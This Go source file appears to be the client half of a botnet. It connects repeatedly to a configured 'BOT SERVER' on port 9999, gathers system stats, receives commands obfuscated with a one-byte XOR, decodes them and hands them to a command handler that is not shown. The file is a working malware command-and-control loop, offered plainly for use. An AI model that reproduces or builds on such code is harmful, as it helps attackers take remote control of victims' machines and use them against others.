package main

import (
	"bytes"
	"fmt"
	"homo/client/balancer"
	"net"
)

// config
const (
	TARGET_SERVER = "127.0.0.1" // BOT SERVER
	TARGET_PORT   = "9999"      // BOT PORT
)

type BalancerStats struct {
	Latency string
	Cpu     int
	Memory  int
}

func main() {
CONNECT:
	connection, err := net.Dial("tcp", TARGET_SERVER+":"+TARGET_PORT)

	if err != nil {
		fmt.Println(err)
		goto CONNECT
	}

	lat, cpu, mem, err := balancer.GetStats()

	if err != nil {
		fmt.Println(err)
	}

	b := NewStats(lat, cpu, mem)

	for {

		command := make([]byte, 6000)

		_, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		if bytes.HasPrefix(command, []byte{112, 105, 110, 103}) { // ping message
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0}) { // nil message
			continue
		}

		var cmd string
		for _, i := range command {
			cmd += string(i ^ 3)
		}

		CommandHandler(cmd)
		balancer.Balancer(b.Cpu, b.Latency, b.Memory)
	}
}

func NewStats(latency string, cpu, memory int) *BalancerStats {

	return &BalancerStats{
		Latency: latency,
		Cpu:     cpu,
		Memory:  memory,
	}
}
